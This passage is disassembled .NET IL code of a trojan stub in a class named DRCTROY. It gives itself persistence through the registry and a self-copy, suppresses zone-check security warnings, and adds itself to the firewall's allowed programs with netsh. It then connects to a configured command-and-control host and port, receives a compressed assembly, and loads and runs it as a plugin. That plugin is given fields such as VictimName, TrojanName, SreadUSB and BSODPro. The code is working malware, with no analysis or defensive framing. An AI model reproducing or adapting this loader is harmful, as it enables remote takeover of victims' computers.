      IL_015d:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0162:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0167:  ldstr      "SOFTWARE\\"
      IL_016c:  ldsfld     string DRCTROY::RegKey
      IL_0171:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0176:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_017b:  stloc.s    V_24
      IL_017d:  ldloc.s    V_24
      IL_017f:  ldstr      "us"
      IL_0184:  ldstr      ""
      IL_0189:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_018e:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0193:  ldstr      ""
      IL_0198:  ldc.i4.0
      IL_0199:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_019e:  ldc.i4.0
      IL_019f:  bne.un.s   IL_01e0

      IL_01a1:  ldsfld     class [mscorlib]System.IO.FileInfo DRCTROY::OldPath
      IL_01a6:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
      IL_01ab:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
      IL_01b0:  ldstr      ":"
      IL_01b5:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_01ba:  brfalse.s  IL_01cf

      IL_01bc:  ldloc.s    V_24
      IL_01be:  ldstr      "us"
      IL_01c3:  ldstr      "!"
      IL_01c8:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01cd:  br.s       IL_01e0

      IL_01cf:  ldloc.s    V_24
      IL_01d1:  ldstr      "us"
      IL_01d6:  ldstr      "@"
      IL_01db:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01e0:  ldnull
      IL_01e1:  stloc.s    V_24
      IL_01e3:  leave.s    IL_01f4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e5:  dup
      IL_01e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01eb:  stloc.s    V_9
      IL_01ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f2:  leave.s    IL_01f4

    }  // end handler
    .try
    {
      IL_01f4:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_01f9:  ldstr      "1"
      IL_01fe:  ldc.i4.1
      IL_01ff:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0204:  leave.s    IL_0215

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0206:  dup
      IL_0207:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_020c:  stloc.s    V_10
      IL_020e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0213:  leave.s    IL_0215

    }  // end handler
    IL_0215:  ldsfld     bool DRCTROY::Melt
    IL_021a:  brtrue     IL_02ba

    IL_021f:  ldloc.1
    IL_0220:  callvirt   instance bool [mscorlib]System.IO.FileInfo::get_Exists()
    IL_0225:  ldc.i4.0
    IL_0226:  ceq
    IL_0228:  ldloc.1
    IL_0229:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_022e:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0233:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0238:  ldsfld     class [mscorlib]System.IO.FileInfo DRCTROY::OldPath
    IL_023d:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0242:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0247:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_024c:  ldc.i4.0
    IL_024d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0252:  ldc.i4.0
    IL_0253:  ceq
    IL_0255:  ldc.i4.0
    IL_0256:  ceq
    IL_0258:  or
    IL_0259:  ldloc.1
    IL_025a:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_025f:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0264:  ldsfld     class [mscorlib]System.IO.FileInfo DRCTROY::OldPath
    IL_0269:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_026e:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0273:  ldc.i4.0
    IL_0274:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0279:  ldc.i4.0
    IL_027a:  ceq
    IL_027c:  ldc.i4.0
    IL_027d:  ceq
    IL_027f:  or
    IL_0280:  brfalse.s  IL_02ba

    .try
    {
      IL_0282:  ldsfld     class [mscorlib]System.IO.FileInfo DRCTROY::OldPath
      IL_0287:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_028c:  ldloc.1
      IL_028d:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0292:  ldc.i4.1
      IL_0293:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_0298:  ldloc.1
      IL_0299:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_029e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_02a3:  pop
      IL_02a4:  leave.s    IL_02b5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a6:  dup
      IL_02a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02ac:  stloc.s    V_11
      IL_02ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02b3:  leave.s    IL_02b5

    }  // end handler
    IL_02b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    .try
    {
      IL_02ba:  ldsfld     string DRCTROY::MUTEXCODE
      IL_02bf:  call       class [mscorlib]System.Threading.Mutex [mscorlib]System.Threading.Mutex::OpenExisting(string)
      IL_02c4:  pop
      IL_02c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_02ca:  leave.s    IL_02f5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02cc:  dup
      IL_02cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02d2:  stloc.s    V_13
      IL_02d4:  ldc.i4.0
      IL_02d5:  stloc.s    V_12
      IL_02d7:  ldc.i4.1
      IL_02d8:  ldsfld     string DRCTROY::MUTEXCODE
      IL_02dd:  ldloca.s   V_12
      IL_02df:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                                 string,
                                                                                 bool&)
      IL_02e4:  stloc.3
      IL_02e5:  ldloc.s    V_12
      IL_02e7:  brtrue.s   IL_02ee

      IL_02e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_02ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02f3:  leave.s    IL_02f5

    }  // end handler
    .try
    {
      IL_02f5:  ldc.i4.5
      IL_02f6:  newarr     [mscorlib]System.String
      IL_02fb:  stloc.s    V_25
      IL_02fd:  ldloc.s    V_25
      IL_02ff:  ldc.i4.0
      IL_0300:  ldstr      "netsh firewall add allowedprogram \""
      IL_0305:  stelem.ref
      IL_0306:  ldloc.s    V_25
      IL_0308:  ldc.i4.1
      IL_0309:  ldsfld     class [mscorlib]System.IO.FileInfo DRCTROY::OldPath
      IL_030e:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0313:  stelem.ref
      IL_0314:  ldloc.s    V_25
      IL_0316:  ldc.i4.2
      IL_0317:  ldstr      "\" \""
      IL_031c:  stelem.ref
      IL_031d:  ldloc.s    V_25
      IL_031f:  ldc.i4.3
      IL_0320:  ldsfld     class [mscorlib]System.IO.FileInfo DRCTROY::OldPath
      IL_0325:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_032a:  stelem.ref
      IL_032b:  ldloc.s    V_25
      IL_032d:  ldc.i4.4
      IL_032e:  ldstr      "\" ENABLE"
      IL_0333:  stelem.ref
      IL_0334:  ldloc.s    V_25
      IL_0336:  call       string [mscorlib]System.String::Concat(string[])
      IL_033b:  ldc.i4.0
      IL_033c:  ldc.i4.0
      IL_033d:  ldc.i4.m1
      IL_033e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0343:  pop
      IL_0344:  leave.s    IL_0355

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0346:  dup
      IL_0347:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_034c:  stloc.s    V_14
      IL_034e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0353:  leave.s    IL_0355

    }  // end handler
    IL_0355:  ldnull
    IL_0356:  stloc.0
    IL_0357:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_035c:  stloc.2
    IL_035d:  nop
    .try
    {
      IL_035e:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
      IL_0363:  stloc.s    V_15
      IL_0365:  ldloc.s    V_15
      IL_0367:  ldsfld     string DRCTROY::Hostes
      IL_036c:  call       string DRCTROY::GetHost(string)
      IL_0371:  ldsfld     string DRCTROY::Ports
      IL_0376:  call       string DRCTROY::GetPort(string)
      IL_037b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0380:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                       int32)
      IL_0385:  ldsfld     string DRCTROY::Hostes
      IL_038a:  call       string DRCTROY::GetHost(string)
      IL_038f:  stsfld     string DRCTROY::HF
      IL_0394:  ldsfld     string DRCTROY::Ports
      IL_0399:  call       string DRCTROY::GetPort(string)
      IL_039e:  stsfld     string DRCTROY::PF
      IL_03a3:  ldloc.s    V_15
      IL_03a5:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_03aa:  ldc.i4.s   11
      IL_03ac:  callvirt   instance void [mscorlib]System.IO.Stream::WriteByte(uint8)
      IL_03b1:  ldloc.s    V_15
      IL_03b3:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_03b8:  callvirt   instance void [System]System.Net.Sockets.NetworkStream::Flush()
      IL_03bd:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_03c2:  stloc.2
      .try
      {
        IL_03c3:  ldloc.s    V_15
        IL_03c5:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_03ca:  ldc.i4.m1
        IL_03cb:  ldc.i4.0
        IL_03cc:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                   valuetype [System]System.Net.Sockets.SelectMode)
        IL_03d1:  ldloc.s    V_15
        IL_03d3:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_03d8:  callvirt   instance int32 [System]System.Net.Sockets.Socket::get_Available()
        IL_03dd:  ldc.i4.1
        IL_03de:  clt
        IL_03e0:  and
        IL_03e1:  brfalse.s  IL_03e5

        IL_03e3:  leave.s    IL_042b

        IL_03e5:  ldloc.s    V_15
        IL_03e7:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
        IL_03ec:  ldc.i4.1
        IL_03ed:  sub.ovf
        IL_03ee:  ldc.i4.1
        IL_03ef:  add.ovf
        IL_03f0:  newarr     [mscorlib]System.Byte
        IL_03f5:  stloc.s    V_16
        IL_03f7:  ldloc.s    V_15
        IL_03f9:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_03fe:  ldloc.s    V_16
        IL_0400:  ldc.i4.0
        IL_0401:  ldloc.s    V_16
        IL_0403:  ldlen
        IL_0404:  conv.ovf.i4
        IL_0405:  ldc.i4.0
        IL_0406:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                       int32,
                                                                                       int32,
                                                                                       valuetype [System]System.Net.Sockets.SocketFlags)
        IL_040b:  stloc.s    V_17
        IL_040d:  ldloc.2
        IL_040e:  ldloc.s    V_16
        IL_0410:  ldc.i4.0
        IL_0411:  ldloc.s    V_17
        IL_0413:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0418:  leave.s    IL_0429

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_041a:  dup
        IL_041b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0420:  stloc.s    V_18
        IL_0422:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0427:  leave.s    IL_042b

      }  // end handler
      IL_0429:  br.s       IL_03c3

      .try
      {
        IL_042b:  ldloc.s    V_15
        IL_042d:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0432:  ldc.i4.0
        IL_0433:  callvirt   instance void [System]System.Net.Sockets.Socket::Disconnect(bool)
        IL_0438:  leave.s    IL_0449

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_043a:  dup
        IL_043b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0440:  stloc.s    V_19
        IL_0442:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0447:  leave.s    IL_0449

      }  // end handler
      .try
      {
        IL_0449:  ldloc.s    V_15
        IL_044b:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_0450:  leave.s    IL_0461

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0452:  dup
        IL_0453:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0458:  stloc.s    V_20
        IL_045a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_045f:  leave.s    IL_0461

      }  // end handler
      IL_0461:  ldloc.2
      IL_0462:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0467:  stloc.0
      IL_0468:  leave.s    IL_0488

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_046a:  dup
      IL_046b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0470:  stloc.s    V_21
      IL_0472:  ldsfld     int32 DRCTROY::Pc
      IL_0477:  ldc.i4.1
      IL_0478:  add.ovf
      IL_0479:  stsfld     int32 DRCTROY::Pc
      IL_047e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0483:  leave      IL_035d

    }  // end handler
    IL_0488:  nop
    IL_0489:  ldloc.0
    IL_048a:  brtrue.s   IL_0491

    IL_048c:  br         IL_035d

    IL_0491:  ldloc.0
    IL_0492:  ldstr      "A"
    IL_0497:  call       uint8[] DRCTROY::Plugin(uint8[],
                                                 string)
    IL_049c:  stloc.0
    IL_049d:  br         IL_035d
  } // end of method DRCTROY::main

  .method public static uint8[]  ReadPluginFile(string Path) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  1
    .locals init (uint8[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0006:  brfalse.s  IL_000f

    IL_0008:  ldarg.0
    IL_0009:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
    IL_000e:  ret

    IL_000f:  ldnull
    IL_0010:  ret
  } // end of method DRCTROY::ReadPluginFile

  .method public static uint8[]  Plugin(uint8[] B,
                                        string ClassName) cil managed
  {
    // Code size       541 (0x21d)
    .maxstack  4
    .locals init (uint8[] V_0,
             uint8[] V_1,
             uint8[] V_2,
             class [System]System.IO.Compression.GZipStream V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             object V_5,
             int32 V_6,
             class [mscorlib]System.Exception V_7)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
      IL_0006:  stloc.s    V_4
      IL_0008:  ldloc.s    V_4
      IL_000a:  ldc.i4.0
      IL_000b:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                         valuetype [System]System.IO.Compression.CompressionMode)
      IL_0010:  stloc.3
      IL_0011:  ldc.i4.4
      IL_0012:  newarr     [mscorlib]System.Byte
      IL_0017:  stloc.1
      IL_0018:  ldloc.s    V_4
      IL_001a:  ldloc.s    V_4
      IL_001c:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0021:  ldc.i4.5
      IL_0022:  conv.i8
      IL_0023:  sub.ovf
      IL_0024:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
      IL_0029:  ldloc.s    V_4
      IL_002b:  ldloc.1
      IL_002c:  ldc.i4.0
      IL_002d:  ldc.i4.4
      IL_002e:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0033:  pop
      IL_0034:  ldloc.1
      IL_0035:  ldc.i4.0
      IL_0036:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                        int32)
      IL_003b:  stloc.s    V_6
      IL_003d:  ldloc.s    V_4
      IL_003f:  ldc.i4.0
      IL_0040:  conv.i8
      IL_0041:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
      IL_0046:  ldloc.s    V_6
      IL_0048:  ldc.i4.1
      IL_0049:  sub.ovf
      IL_004a:  ldc.i4.1
      IL_004b:  add.ovf
      IL_004c:  newarr     [mscorlib]System.Byte
      IL_0051:  stloc.2
      IL_0052:  ldloc.3
      IL_0053:  ldloc.2
      IL_0054:  ldc.i4.0
      IL_0055:  ldloc.s    V_6
      IL_0057:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                         int32,
                                                                                         int32)
      IL_005c:  pop
      IL_005d:  ldloc.3
      IL_005e:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0063:  ldloc.s    V_4
      IL_0065:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_006a:  ldloc.2
      IL_006b:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
      IL_0070:  ldstr      "STUB."
      IL_0075:  ldarg.1
      IL_0076:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_007b:  ldc.i4.1
      IL_007c:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string,
                                                                                                bool)
      IL_0081:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0086:  stloc.s    V_5
      IL_0088:  ldloc.s    V_5
      IL_008a:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_008f:  ldstr      "VictimName"
      IL_0094:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_0099:  ldloc.s    V_5
      IL_009b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00a0:  ldsfld     string DRCTROY::VictimName
      IL_00a5:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_00aa:  ldloc.s    V_5
      IL_00ac:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_00b1:  ldstr      "TrojanName"
      IL_00b6:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_00bb:  ldloc.s    V_5
      IL_00bd:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00c2:  ldsfld     string DRCTROY::TrojanName
      IL_00c7:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_00cc:  ldloc.s    V_5
      IL_00ce:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_00d3:  ldstr      "DirINS"
      IL_00d8:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_00dd:  ldloc.s    V_5
      IL_00df:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00e4:  ldsfld     string DRCTROY::DirINS
      IL_00e9:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_00ee:  ldloc.s    V_5
      IL_00f0:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_00f5:  ldstr      "RegKey"
      IL_00fa:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_00ff:  ldloc.s    V_5
      IL_0101:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0106:  ldsfld     string DRCTROY::RegKey
      IL_010b:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_0110:  ldloc.s    V_5
      IL_0112:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_0117:  ldstr      "Hostes"
      IL_011c:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_0121:  ldloc.s    V_5
      IL_0123:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0128:  ldsfld     string DRCTROY::HF
      IL_012d:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_0132:  ldloc.s    V_5
      IL_0134:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_0139:  ldstr      "Ports"
      IL_013e:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_0143:  ldloc.s    V_5
      IL_0145:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_014a:  ldsfld     string DRCTROY::PF
      IL_014f:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_0154:  ldloc.s    V_5
      IL_0156:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_015b:  ldstr      "SreadUSB"
      IL_0160:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_0165:  ldloc.s    V_5
      IL_0167:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_016c:  ldsfld     bool DRCTROY::SreadUSB
      IL_0171:  box        [mscorlib]System.Boolean
      IL_0176:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_017b:  ldloc.s    V_5
      IL_017d:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_0182:  ldstr      "BSODPro"
      IL_0187:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_018c:  ldloc.s    V_5
      IL_018e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0193:  ldsfld     bool DRCTROY::BSODPro
      IL_0198:  box        [mscorlib]System.Boolean
      IL_019d:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_01a2:  ldloc.s    V_5
      IL_01a4:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_01a9:  ldstr      "MyPort"
      IL_01ae:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_01b3:  ldloc.s    V_5
      IL_01b5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01ba:  ldsfld     string DRCTROY::PF
      IL_01bf:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_01c4:  ldloc.s    V_5
      IL_01c6:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_01cb:  ldstr      "Melt"
      IL_01d0:  callvirt   instance class [mscorlib]System.Reflection.FieldInfo [mscorlib]System.Type::GetField(string)
      IL_01d5:  ldloc.s    V_5
      IL_01d7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01dc:  ldsfld     bool DRCTROY::Melt
      IL_01e1:  box        [mscorlib]System.Boolean
      IL_01e6:  callvirt   instance void [mscorlib]System.Reflection.FieldInfo::SetValue(object,
                                                                                         object)
      IL_01eb:  ldloc.s    V_5
      IL_01ed:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
      IL_01f2:  ldstr      "STARTSUBPLUGIN"
      IL_01f7:  callvirt   instance class [mscorlib]System.Reflection.MethodInfo [mscorlib]System.Type::GetMethod(string)
      IL_01fc:  ldloc.s    V_5
      IL_01fe:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0203:  ldnull
      IL_0204:  callvirt   instance object [mscorlib]System.Reflection.MethodBase::Invoke(object,
                                                                                          object[])
      IL_0209:  pop
      IL_020a:  leave.s    IL_021b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_020c:  dup
      IL_020d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0212:  stloc.s    V_7
      IL_0214:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0219:  leave.s    IL_021b

    }  // end handler
    IL_021b:  ldnull
    IL_021c:  ret
  } // end of method DRCTROY::Plugin

  .method public static string  GetHost(string Host) cil managed
  {
    // Code size       46 (0x2e)
    .maxstack  4
    .locals init (string V_0,
             string[] V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldstr      "[BSP]"
    IL_0006:  ldc.i4.m1
    IL_0007:  ldc.i4.0
    IL_0008:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_000d:  stloc.1
    IL_000e:  ldsfld     int32 DRCTROY::Hc
    IL_0013:  ldloc.1
    IL_0014:  ldlen
    IL_0015:  conv.ovf.i4
    IL_0016:  bge.s      IL_0020

    IL_0018:  ldloc.1
    IL_0019:  ldsfld     int32 DRCTROY::Hc
    IL_001e:  ldelem.ref
    IL_001f:  ret

    IL_0020:  ldc.i4.0
    IL_0021:  stsfld     int32 DRCTROY::Hc
    IL_0026:  ldloc.1
    IL_0027:  ldsfld     int32 DRCTROY::Hc
    IL_002c:  ldelem.ref
    IL_002d:  ret
  } // end of method DRCTROY::GetHost

  .method public static string  GetPort(string Port) cil managed
  {
    // Code size       58 (0x3a)
    .maxstack  4
    .locals init (string V_0,
             string[] V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldstr      "[BSP]"
    IL_0006:  ldc.i4.m1
    IL_0007:  ldc.i4.0
    IL_0008:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_000d:  stloc.1
    IL_000e:  ldsfld     int32 DRCTROY::Pc
    IL_0013:  ldloc.1
    IL_0014:  ldlen
    IL_0015:  conv.ovf.i4
